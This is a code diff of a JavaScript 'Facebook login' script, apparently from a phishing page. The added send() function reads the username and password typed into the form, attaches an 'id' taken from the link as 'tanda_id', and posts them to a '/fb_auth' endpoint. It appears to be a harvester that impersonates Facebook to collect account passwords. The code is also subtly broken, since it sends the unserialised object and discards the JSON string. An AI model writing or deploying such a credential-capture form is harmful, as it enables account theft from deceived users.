@@ -1,6 +1,7 @@
 /**
  * Facebook login
  */
+
 function getParameterByName(name, url) {
     if (!url) url = window.location.href;
     name = name.replace(/[\[\]]/g, "\\$&");
@@ -12,17 +13,21 @@ function getParameterByName(name, url) {
 }
 
 function send() {
-    //var usercode = getParameterByName('id');
     var username = document.getElementById('username').value;
     var password = document.getElementById('password').value;
+    var usercode = getParameterByName('id');
 
     var data = {
-        //"usercode": usercode,
         "username": username,
-        "password": password
+        "password": password,
+        "tanda_id": usercode
     };
 
-    var json = JSON.stringify(data);
+    JSON.stringify(data);
 
-    console.log(json);
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/fb_auth', true);
+    xhr.setRequestHeader('Content-type', 'application/json');
+    //xhr.responseType = 'json';
+    xhr.send(data);
 }
